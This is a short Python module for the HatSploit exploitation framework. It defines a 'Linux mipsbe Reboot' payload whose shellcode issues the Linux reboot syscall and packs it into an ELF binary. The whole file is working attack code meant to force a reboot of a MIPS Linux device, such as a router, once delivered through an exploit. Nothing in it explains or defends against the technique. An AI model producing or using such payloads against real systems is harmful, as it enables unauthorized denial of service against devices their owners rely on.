#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux mipsbe Reboot",
        'Payload': "linux/mipsbe/reboot",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Reboot payload for Linux mipsbe.",
        'Comments': [
            ''
        ],
        'Architecture': "mipsbe",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    def run(self):
        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x3c\x06\x43\x21"  # lui     a2,0x4321
            b"\x34\xc6\xfe\xdc"  # ori     a2,a2,0xfedc
            b"\x3c\x05\x28\x12"  # lui     a1,0x2812
            b"\x34\xa5\x19\x69"  # ori     a1,a1,0x1969
            b"\x3c\x04\xfe\xe1"  # lui     a0,0xfee1
            b"\x34\x84\xde\xad"  # ori     a0,a0,0xdead
            b"\x24\x02\x0f\xf8"  # li      v0,4088
            b"\x01\x01\x01\x0c"  # syscall 0x40404
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'mipsbe', shellcode)

        return payload
